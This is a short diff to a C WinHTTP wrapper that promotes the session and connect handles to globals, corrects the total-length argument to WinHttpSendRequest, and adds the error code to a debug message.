@@ -5,6 +5,8 @@
 #include "win_http.h"
 
 HINTERNET hGlobalInternet = 0;
+HINTERNET hSession = 0;
+HINTERNET hConnect = 0;
 
 PBYTE WinHTTPGetResponse(PULONG uOut)
 {
@@ -76,13 +78,16 @@ BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen)
 		-1L, 
 		pBuffer, 
 		uBuffLen, 
-		0,
+		uBuffLen,
 		NULL);
 
 	if (!ret)
 	{
 #ifdef _DEBUG
-		OutputDebugString(L"[!!] WinHttpSendRequest fail\n");
+		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
+		swprintf_s(pDebugString, 1024, L"[!!] WinHttpSendRequest fail: %08x\n", GetLastError());
+		OutputDebugString(pDebugString);
+		free(pDebugString);
 #endif
 	}
 
@@ -97,7 +102,6 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	DWORD dwOptions = 0;
 	WCHAR _wHostProto[256];
 	WCHAR _wHost[256];
-	HINTERNET hSession = 0, hConnect = 0;
 	PBYTE pAddrPtr;
 	char *wTypes[] = { "*\x00/\x00*\x00", 0x0 };
 	BOOL isProxy = FALSE;
